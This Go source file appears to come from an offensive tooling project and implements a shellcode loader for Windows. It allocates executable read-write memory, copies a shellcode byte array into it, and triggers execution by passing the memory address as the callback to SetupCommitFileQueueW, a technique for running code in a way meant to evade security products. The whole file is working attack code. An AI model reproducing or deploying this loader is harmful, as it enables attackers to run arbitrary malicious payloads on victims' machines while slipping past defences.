package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

//需要 setupapi.dll

const (
	MEM_RESERVE            = 0x2000
	MEM_COMMIT             = 0x1000
	MEM_RELEASE            = 0x8000
	PAGE_EXECUTE_READWRITE = 0x40
)

// Run is the main function to process op
func Run(op []byte) {
	// Load required Windows libraries
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	User32 := syscall.MustLoadDLL("User32.dll")
	setupapi := syscall.MustLoadDLL("Setupapi.dll")

	// Load required Windows functions
	virtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	virtualFree := kernel32.MustFindProc("VirtualFree")
	setupOpenFileQueue := setupapi.MustFindProc("SetupOpenFileQueue")
	setupQueueCopy := setupapi.MustFindProc("SetupQueueCopyW")
	setupCommitFileQueue := setupapi.MustFindProc("SetupCommitFileQueueW")
	getTopWindow := User32.MustFindProc("GetTopWindow")

	// Allocate memory with required permissions
	address, _, err := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if address == 0 {
		fmt.Printf("VirtualAlloc failed with error: %v\n", err)
		return
	}
	defer virtualFree.Call(address, 0, MEM_RELEASE)

	// Copy op into the allocated memory using a for loop
	for i := range op {
		*(*byte)(unsafe.Pointer(address + uintptr(i))) = op[i]
	}

	// Create a file queue
	hQueue, _, err := setupOpenFileQueue.Call()
	if hQueue == 0 {
		fmt.Printf("SetupOpenFileQueue failed with error: %v\n", err)
		return
	}
	cpath, _ := syscall.UTF16PtrFromString("c:\\")
	secPath, _ := syscall.UTF16PtrFromString("\\windows\\system32\\")
	thPath, _ := syscall.UTF16PtrFromString("kernel32.dll")
	sixPath, _ := syscall.UTF16PtrFromString("c:\\windows\\temp\\")
	sevePath, _ := syscall.UTF16PtrFromString("kernel32.dll")
	// Set up the file copy operation
	setupQueueCopy.Call(
		hQueue,
		uintptr(unsafe.Pointer(cpath)),
		uintptr(unsafe.Pointer(secPath)),
		uintptr(unsafe.Pointer(thPath)),
		0,
		0,
		uintptr(unsafe.Pointer(sixPath)),
		uintptr(unsafe.Pointer(sevePath)),
		0x00000001, // SP_COPY_NOSKIP
	)

	// Commit the file queue
	topWindow, _, err := getTopWindow.Call(0)
	ret, _, err := setupCommitFileQueue.Call(topWindow, hQueue, uintptr(address), 0)
	if ret == 0 {
		fmt.Printf("SetupCommitFileQueue failed with error: %v\n", err)
		return
	}
}

func main() {
	Run(util.ShellCode())
}
